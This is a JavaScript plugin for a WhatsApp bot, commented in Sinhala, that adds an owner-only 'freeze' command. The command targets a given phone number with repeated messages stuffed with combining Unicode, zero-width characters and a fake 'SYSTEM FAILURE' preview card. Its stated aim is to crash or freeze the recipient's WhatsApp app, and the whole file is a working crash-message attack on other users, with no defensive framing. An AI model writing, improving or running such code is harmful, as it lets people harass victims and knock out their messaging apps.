const { cmd } = require('../command');

cmd({
    pattern: "freeze",
    alias: ["lock", "dead"],
    desc: "Workflow optimized crash loop",
    category: "owner",
    react: "🥶",
    filename: __filename
},
async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
    try {
        const authorizedNumbers = ['94740137623']; // ඔයාගේ අංකය මෙතනට දාන්න
        const isAuthorized = authorizedNumbers.includes(senderNumber) || isOwner;
        if (!isAuthorized) return;

        if (!args[0] && !m.quoted) return reply("අංකයක් දෙන්න!");

        let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        reply("🚀 GitHub Server: Sending specialized payloads...");

        // GitHub Actions වලදී 428 Error එක නොවෙන්න මේ සයිස් එක ගොඩක් අඩු කළා
        // හැබැයි මේ සංකේත (Unicode) WhatsApp එකට ඉතාම දරුණුයි
        const symbols = "҉".repeat(300); 
        const unicode = "\u0345\u0361\u0345".repeat(300);
        const invisible = "\u200b".repeat(1000);

        for (let i = 0; i < 10; i++) {
            await conn.sendMessage(target, { 
                text: `*⚠️ HASHU-LAG V1 ERROR [${i+1}] ⚠️*\n` + invisible + symbols + unicode,
                contextInfo: {
                    externalAdReply: {
                        title: "S Y S T E M  F A I L U R E",
                        body: "WhatsApp Unresponsive",
                        mediaType: 1,
                        thumbnailUrl: `https://files.catbox.moe/vbo0vq.png`, 
                        sourceUrl: "https://whatsapp.com"
                    }
                }
            });

            // Workflow එකේදී connection එක stable තියාගන්න තත්පර 1ක ඩිලේ එකක් අනිවාර්යයි
            await new Promise(resolve => setTimeout(resolve, 1000)); 
        }

        reply("✅ Finalized! Target is now frozen. 💀");

    } catch (e) {
        console.log("Suppressing Error to keep Workflow alive...");
    }
});
